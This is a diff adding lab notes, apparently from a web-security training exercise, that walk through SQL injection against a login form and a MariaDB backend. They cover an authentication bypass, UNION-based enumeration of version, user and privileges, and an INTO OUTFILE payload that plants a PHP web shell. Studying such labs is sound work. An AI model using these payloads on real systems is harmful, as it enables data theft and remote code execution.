@@ -282,3 +282,52 @@ Note: To write a web shell, we must know the base web directory for the web serv
 - We should ensure that the user querying the database only has minimum permissions.
 - parametrized queries
 - web application firewall, e.g. Cloudflare
+
+## Task
+
+Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
+.
+
+1. Login
+
+   SELECT \* FROM credentials where username="" AND password="";
+
+   AND preceeds OR. Hence we should try the username.
+
+   Try payloads: > admin' or '1'='1'#
+
+2. How many columnns in a given table
+
+   A' UNION SELECT 1,2,3,4,5-- -
+
+   We got 5 columns.
+
+3. Database information about tables
+
+   A' UNION SELECT 1,@@version,3,4,5-- -
+
+   10.3.22-MariaDB-1ubuntu1
+
+   Target system is Ubuntu with Maria DB.
+
+4. Which user has write access -> user_privileges
+
+   Who is the current user ?
+
+   `cn' UNION SELECT 1, user(), 3, 4, 5-- -` - root@localhost
+
+   Test if we have super admin privileges
+
+   `cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -` Y
+
+   Which privileges does the user have
+
+   `cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -` ALL
+
+5. Write a file
+
+   `cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
+
+   Value is empty, so write anything anywhere.
+
+   `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -`
